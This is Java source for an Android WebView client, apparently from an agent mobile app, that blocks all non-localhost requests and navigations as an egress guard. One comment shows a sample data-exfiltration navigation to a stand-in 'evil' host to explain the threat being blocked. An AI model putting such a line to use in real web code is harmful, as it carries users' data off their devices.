package com.agentmobile.agent;

import android.net.Uri;
import android.util.Log;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebView;
import com.getcapacitor.Bridge;
import com.getcapacitor.BridgeWebViewClient;
import java.io.ByteArrayInputStream;

/**
 * EgressWebViewClient — the native (non-VPN) webview egress blocker.
 *
 * <p>The webview is the only untrusted surface and has no legitimate network use:
 * everything is rendered from data the native plugin pushes, and the only socket to
 * the wire is the native gateway WebSocket (an app-level socket, unaffected here).
 * So we deny EVERY webview-initiated network request except our own local origin.
 *
 * <p>Any request whose host is not "localhost" (the Capacitor local server) returns an
 * empty response — it never leaves the device. This is load-bearing: CSP and a patched
 * fetch() are layer-1 tripwires; this is the guarantee at the native WebView boundary.
 * Navigations (shouldOverrideUrlLoading) to anything but the app origin are swallowed too,
 * so no URL can be handed to an external app (Capacitor's default launches an Intent).
 * Note: WebSocket handshakes and WebRTC/DNS are NOT seen by shouldInterceptRequest — those
 * are closed by CSP connect-src 'none' and the realm hardening in www/ (see index.html).
 *
 * <p>Deliberately a WebViewClient, not a VPN: it cannot conflict with Tailscale.
 */
public class EgressWebViewClient extends BridgeWebViewClient {

    private static final String TAG = "EgressWebView";

    public EgressWebViewClient(Bridge bridge) {
        super(bridge);
    }

    private static boolean isLocal(Uri u) {
        if (u == null) return false;
        String host = u.getHost(), scheme = String.valueOf(u.getScheme());
        return host != null && (host.equals("localhost") || host.endsWith(".localhost"))
            && (scheme.equals("https") || scheme.equals("http"));
    }

    /**
     * Navigation egress guard. Capacitor's default hands ANY non-app URL to the system via
     * Intent.ACTION_VIEW (external browser / sms: / mailto: / intent: / market: ...), so a
     * `location.href = "https://evil/?d=..."` or window.open from main-window JS would carry
     * data off the device through another app. Here: only the app's own origin may load;
     * everything else is swallowed (no navigation, no Intent).
     */
    @Override
    public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
        Uri u = request == null ? null : request.getUrl();
        if (isLocal(u)) return super.shouldOverrideUrlLoading(view, request);
        Log.w(TAG, "DENIED webview navigation -> " + u);
        return true;
    }

    @Override
    @SuppressWarnings("deprecation")
    public boolean shouldOverrideUrlLoading(WebView view, String url) {
        Uri u = url == null ? null : Uri.parse(url);
        if (isLocal(u)) return super.shouldOverrideUrlLoading(view, url);
        Log.w(TAG, "DENIED webview navigation -> " + url);
        return true;
    }

    @Override
    public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) {
        String url = request.getUrl() == null ? "" : request.getUrl().toString();
        String host = request.getUrl() == null ? null : request.getUrl().getHost();
        boolean local = host != null && (host.equals("localhost") || host.endsWith(".localhost"));
        if (!local) {
            Log.w(TAG, "DENIED webview egress -> " + url);
            // empty 200 body: the request never reaches the network
            return new WebResourceResponse("text/plain", "utf-8",
                    new ByteArrayInputStream(new byte[0]));
        }
        return super.shouldInterceptRequest(view, request);
    }
}
